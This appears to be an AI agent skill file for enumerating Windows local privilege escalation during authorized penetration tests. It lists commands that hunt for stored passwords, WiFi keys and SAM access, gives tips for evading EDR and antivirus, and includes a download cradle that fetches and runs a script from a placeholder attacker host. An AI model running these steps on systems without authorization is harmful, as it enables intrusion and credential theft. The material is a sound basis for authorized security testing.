---
name: windows-discovery
description: >
  Windows local privilege escalation enumeration and attack surface mapping. Use this
  skill when the user has a shell on a Windows machine and needs to escalate privileges,
  or says "enumerate privesc", "check for privilege escalation", "run winpeas",
  "windows privesc", "local privesc", "check my privileges". Also triggers on:
  "escalate on windows", "what can I escalate", "post-exploitation windows".
  OPSEC: low-medium (enumeration tools create process artifacts).
  Tools: WinPEAS, PowerUp, Seatbelt, Watson, WES-NG, PrivescCheck, accesschk.
  Do NOT use for Linux privesc — use linux-discovery instead.
  Do NOT use for AD-level attacks — use ad-discovery instead.
---

# Windows Local Privilege Escalation Discovery

You are helping a penetration tester enumerate a Windows system for local privilege
escalation vectors. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Run full enumeration, collect all findings, present prioritized
  attack surface with routing recommendations. Only pause for high-OPSEC actions.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones:
  `### [HH:MM] windows-discovery → <hostname>` with enumeration findings.
- **Findings** → append to `engagement/findings.md` when a privesc vector is confirmed.
- **Evidence** → save enumeration output to `engagement/evidence/` (e.g.,
  `winpeas-output.txt`, `whoami-priv.txt`).

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[windows-discovery] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] windows-discovery → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[HH:MM]` with the actual current time. Run
`date +%H:%M` to get it. Never write the literal placeholder `[HH:MM]` —
activity.md entries need real timestamps for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.

## Skill Routing Is Mandatory

When this skill says "→ STOP. Invoke **skill-name**" or "route to
**skill-name**", you MUST invoke that skill using the Skill tool. Do NOT
execute the technique inline — even if the attack is trivial or you already
know the answer. Skills contain operator-specific methodology, client-scoped
payloads, and edge-case handling that general knowledge does not.

This applies in both guided and autonomous modes. Autonomous mode means you
make routing decisions without asking — it does not mean you skip skills.

### Scope Boundary

This skill's scope is **privilege escalation enumeration and attack surface
mapping**. You identify vectors — you do not exploit them. The moment you
confirm a vector exists, STOP — update state.md and route to the appropriate
technique skill. Do not execute privilege escalation commands inline.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip hosts/vectors already enumerated
- Leverage existing credentials or access
- Check what's been tried and failed (Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add system info (hostname, OS version, architecture, domain membership)
- **Access**: Update current access level (user, service account, local admin)
- **Vulns**: Add confirmed privesc vectors as one-liners with `[found]` status
- **Pivot Map**: Map which vectors lead to which access levels
- **Blocked**: Record failed enumeration attempts

## Prerequisites

- Shell access on a Windows system (cmd.exe, PowerShell, or webshell)
- Know current user context (`whoami`)
- Enumeration tools available on target or transferable

## Step 1: System Information

Gather baseline system information for exploit matching and context.

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
hostname
```

```powershell
[System.Environment]::OSVersion.Version
Get-ComputerInfo | Select-Object CsName, OsName, OsVersion, OsArchitecture, OsBuildNumber, WindowsVersion
wmic os get Caption, Version, BuildNumber, OSArchitecture
```

**Key outputs to note:**
- OS version and build number (determines which exploits/Potatoes work)
- Architecture (x86 vs x64 — affects binary compatibility)
- Hotfix count and list (determines kernel exploit eligibility)
- Domain membership (affects lateral movement options)

**Patch analysis (offline — run on attacker machine):**

```bash
# WES-NG — compare systeminfo against known vulnerabilities
python3 wes.py --update
python3 wes.py systeminfo.txt
```

**Watson (on target — .NET 2.0+):**
```cmd
Watson.exe
```

## Step 2: User Context and Privileges

This is the highest-priority check — token privileges determine immediate escalation paths.

**OPSEC WARNING:** `whoami` and `whoami /priv` are heavily monitored by EDR (CrowdStrike
triggers on these). In OPSEC-sensitive engagements, prefer inferring privileges from
context or using alternative methods:

```powershell
# OPSEC-safe alternatives (less signatured than whoami)
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }

# Check specific privilege without whoami
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")  # Is admin?

# Token privileges via .NET (no whoami.exe process creation)
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class Priv{
    [DllImport("advapi32.dll",SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
    [DllImport("advapi32.dll",SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr t,int c,IntPtr i,int l,out int rl);
}
"@
```

**If OPSEC is not a concern** (CTF, lab, or already detected):

```cmd
whoami /all
whoami /priv
whoami /groups
```

**Infer privileges from context** when possible:
- Running as a Windows service → likely has SeImpersonatePrivilege
- IIS AppPool / MSSQL service → SeImpersonatePrivilege + SeAssignPrimaryTokenPrivilege
- Scheduled task as SYSTEM → full privileges
- Local admin in medium integrity → all privileges present but most disabled (UAC)

**Critical privileges to check:**

| Privilege | Escalation Path | Route To |
|-----------|----------------|----------|
| SeImpersonatePrivilege | Potato family → SYSTEM | **windows-token-impersonation** |
| SeAssignPrimaryTokenPrivilege | Potato family → SYSTEM | **windows-token-impersonation** |
| SeDebugPrivilege | Token duplication from SYSTEM process | **windows-token-impersonation** |
| SeBackupPrivilege | Read SAM/SYSTEM hives → hash extraction | **windows-token-impersonation** |
| SeTakeOwnershipPrivilege | Take ownership of any object → modify DACL | **windows-token-impersonation** |
| SeRestorePrivilege | Write any file → DLL hijack / binary replace | **windows-token-impersonation** |
| SeLoadDriverPrivilege | Load vulnerable kernel driver → SYSTEM | **windows-token-impersonation** |
| SeManageVolumePrivilege | Raw volume read → SAM/secrets extraction | **windows-token-impersonation** |

**User and group context:**

```cmd
net user %USERNAME%
net user
net localgroup
net localgroup administrators
```

```powershell
Get-LocalUser | ft Name, Enabled, LastLogon
Get-LocalGroup | ft Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

**Check for privileged group membership** (abuse-able even without admin):
- Backup Operators → SeBackupPrivilege
- DnsAdmins → DLL loading on DC
- Hyper-V Administrators → VM access
- Print Operators → SeLoadDriverPrivilege
- Remote Desktop Users → RDP access
- Remote Management Users → WinRM access
- Event Log Readers → security log access

## Step 3: Services and Processes

Enumerate services for misconfigurations that enable privilege escalation.

```cmd
sc query state= all
wmic service list brief
tasklist /SVC
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
```

**Unquoted service paths:**

```powershell
# PowerUp
Get-ServiceUnquoted -Verbose

# Manual
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
```

**Service permissions (writable services):**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
accesschk.exe -ucqv <service_name>
```

**Service binary permissions:**

```cmd
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

```powershell
Get-WmiObject win32_service | Select-Object Name, StartMode, PathName | Where-Object {$_.PathName -notlike "C:\Windows*"} | ForEach-Object { $p = ($_.PathName -split '"')[1]; if($p) { icacls $p } }
```

**Service registry ACLs:**

```powershell
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Users Path Everyone"
```

**Running processes (identify DLL hijacking targets):**

```cmd
tasklist /v
wmic process list full
```

```powershell
Get-Process | Select-Object Name, Id, Path | Where-Object {$_.Path -notlike "C:\Windows\System32\*"} | Sort-Object Path
```

Any finding here → STOP. Invoke **windows-service-dll-abuse** via the Skill
tool. Pass: hostname, current user, specific findings (unquoted paths, writable
binaries, modifiable services, DLL hijack targets), OS version, current mode.
Do not execute exploitation commands inline.

## Step 4: Scheduled Tasks and Autorun

```cmd
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v

wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
```

**Check startup folder permissions:**

```cmd
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

**AlwaysInstallElevated (MSI install as SYSTEM):**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must return `0x1` — if so, STOP. Invoke **windows-uac-bypass** via the
Skill tool. Pass: hostname, current user, AlwaysInstallElevated confirmation,
OS version, current mode. Do not execute MSI payload commands inline.

## Step 5: Network and Shares

```cmd
ipconfig /all
route print
arp -a
netstat -ano
net share
```

**Internal-only services (127.0.0.1 listeners):**

```cmd
netstat -ano | findstr LISTENING | findstr 127.0.0.1
```

Look for: databases (3306/5432/1433), web interfaces (8080/8443), management (5985/5986).

**SNMP community strings:**

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
```

**WiFi passwords:**

```cmd
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

**Firewall rules:**

```cmd
netsh advfirewall firewall show rule name=all
netsh firewall show config
```

## Step 6: Credential Hunting (Quick Scan)

Fast checks for stored credentials before running full harvesting tools.

**Windows Credential Manager:**

```cmd
cmdkey /list
```

If entries found → `runas /savecred /user:<user> cmd.exe`

**Registry credentials:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query HKLM /F "password" /t REG_SZ /S /K 2>nul | findstr /i "password"
reg query HKCU /F "password" /t REG_SZ /S /K 2>nul | findstr /i "password"
```

**Unattend/sysprep files:**

```cmd
dir /s /b C:\*unattend.xml C:\*sysprep.xml C:\*sysprep.inf 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul | findstr /i password
```

**IIS web.config:**

```powershell
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul | findstr connectionString
```

**PowerShell history:**

```cmd
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
cat (Get-PSReadlineOption).HistorySavePath | Select-String -Pattern "passw|cred|secret|key|token"
```

**PuTTY/SSH saved sessions:**

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\OpenSSH\Agent\Keys"
```

**HiveNightmare (CVE-2021-36934) — check if exploitable:**

```cmd
icacls C:\Windows\System32\config\SAM
```

If `BUILTIN\Users:(I)(RX)` appears → SAM readable by non-admin users.

Any credentials found → STOP. Invoke **windows-credential-harvesting** via the
Skill tool. Pass: hostname, current user, credential locations found, OS
version, current mode. Do not execute credential extraction commands inline.

## Step 7: Security Controls Detection

```cmd
wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName 2>nul
```

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled
```

**LSASS protection:**

```cmd
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

**Credential Guard:**

```cmd
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v LsaCfgFlags
```

**UAC level:**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

ConsentPromptBehaviorAdmin=0 means UAC disabled. EnableLUA=0 means UAC entirely off.

**AppLocker / WDAC:**

```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

## Step 8: Automated Enumeration Tools

When manual checks are insufficient, run comprehensive tools.

**WinPEAS (comprehensive — includes Watson):**

```cmd
winpeas.exe quiet systeminfo userinfo servicesinfo applicationsinfo networkinfo windowscreds
winpeas.exe quiet fast
winpeas.exe quiet log=winpeas_output.txt
```

**PowerUp (PowerSploit):**

```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

Key checks: `Get-ServiceUnquoted`, `Get-ModifiableServiceFile`, `Get-ModifiableService`,
`Find-PathDLLHijack`, `Find-ProcessDLLHijack`, `Write-UserAddMSI`.

**Seatbelt (GhostPack):**

```cmd
Seatbelt.exe -group=all -outputfile=seatbelt.txt
Seatbelt.exe -group=system
Seatbelt.exe -group=user
```

**PrivescCheck:**

```powershell
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Extended -Report PrivescCheck_Results -Format HTML
```

**JAWS (PowerShell):**

```powershell
. .\jaws-enum.ps1
```

## Step 9: Routing Decision Tree

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

Based on enumeration findings, route to the appropriate technique skill:

### Token Privileges Found

SeImpersonate, SeAssignPrimaryToken, SeDebug, SeBackup, SeTakeOwnership,
SeRestore, SeLoadDriver, SeManageVolume
→ STOP. Invoke **windows-token-impersonation** via the Skill tool. Pass:
  hostname, current user, specific privileges found, OS version and build,
  current mode. Do not execute token impersonation commands inline.

### Service Misconfigurations Found

Unquoted service paths, writable service binaries, modifiable service config,
weak service registry ACLs, DLL search order hijacking, writable PATH directories,
auto-updater abuse
→ STOP. Invoke **windows-service-dll-abuse** via the Skill tool. Pass:
  hostname, current user, specific findings (unquoted paths / writable binaries /
  modifiable services / DLL hijack targets), OS version, current mode. Do not
  execute exploitation commands inline.

### UAC Bypass Needed

High-integrity needed but running medium-integrity, UAC enabled,
AlwaysInstallElevated
→ STOP. Invoke **windows-uac-bypass** via the Skill tool. Pass: hostname,
  current user, integrity level, UAC settings, AlwaysInstallElevated status,
  OS version, current mode. Do not execute UAC bypass commands inline.

### Stored Credentials Found

Registry passwords, unattend files, PowerShell history, DPAPI blobs,
HiveNightmare, credential vault entries
→ STOP. Invoke **windows-credential-harvesting** via the Skill tool. Pass:
  hostname, current user, credential locations found (registry / unattend /
  history / vault), OS version, current mode. Do not execute credential
  extraction commands inline.

### Missing Patches / Kernel Vectors

Watson/WES-NG hits, old OS without patches, vulnerable drivers loaded,
BYOVD candidates
→ STOP. Invoke **windows-kernel-exploits** via the Skill tool. Pass: hostname,
  OS version and build, installed hotfixes, Watson/WES-NG output, vulnerable
  drivers identified, current mode. Do not execute kernel exploits inline.

### Multiple Vectors Found

In **guided** mode, present all findings ranked by reliability and OPSEC:
1. Token impersonation (if SeImpersonate — near-certain, low OPSEC)
2. Service/DLL abuse (if writable — reliable, medium OPSEC)
3. Stored credentials (if found — immediate value)
4. UAC bypass (if needed — reliable, low-medium OPSEC)
5. Kernel exploits (last resort — may crash system)

In **autonomous** mode, pursue the most reliable vector first, fall back on failure.

When routing, pass along: hostname, OS version, current user, integrity level,
specific findings, current mode.

## Troubleshooting

### WinPEAS blocked by AV
Use `winpeas.bat` (batch version) or manual checks from Steps 1-7. SharpUp is a
C# alternative that may evade signature-based detection.

### PowerShell execution restricted
Use `powershell -ep bypass -File script.ps1` or load via download cradle:
`IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1')`

### Limited shell (webshell or restricted cmd)
Focus on `whoami /priv`, `systeminfo`, `netstat -ano`, and `reg query` — these work
in most restricted contexts. Transfer WinPEAS binary if file upload available.

### No tools transferable
Manual enumeration using Steps 1-7 covers the most common vectors using only
built-in Windows commands. Focus on `whoami /priv` (Step 2) and service
enumeration (Step 3) as highest-value manual checks.
